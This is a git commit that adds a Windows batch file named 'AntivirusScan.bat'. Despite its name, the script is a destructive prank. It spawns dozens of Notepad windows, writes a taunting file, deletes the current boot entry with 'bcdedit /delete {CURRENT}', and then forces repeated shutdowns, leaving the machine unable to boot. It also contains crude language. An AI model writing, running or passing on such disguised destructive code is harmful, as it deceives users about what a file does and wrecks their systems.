f7e30dd96a6598992abd33bfa396a0dcf764b477
SuperMYL <88342775+superm-yl@users.noreply.github.com>
2021-09-01 12:42:28 -0500

    Create AntivirusScan.bat

---
+++ AntivirusScan.bat
@@ -0,0 +1,74 @@
+echo this can fuck your windows installation, you sure you want to run this? close the window to exit now
+pause
+echo alright lol
+notepad
+notepad
+notepad
+notepad
+notepad
+notepad
+echo ur pc destroy lol > sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+notepad sex.txt
+timeout 5
+echo i sure hope your PC hasn't died yet!
+bcdedit /delete {CURRENT}
+echo oops! there's no going back!
+timeout 2
+shutdown /s /t 5
+timeout 6
+shutdown /s /t 5
+timeout 6
+shutdown /s /t 5
+timeout 6
+shutdown /s /t 5
+echo fine, you got me. good luck restoring the BCD though!!!!!!!
+timeout 3
+echo also btw bye now
+timeout 2
+shutdown /s /t 0
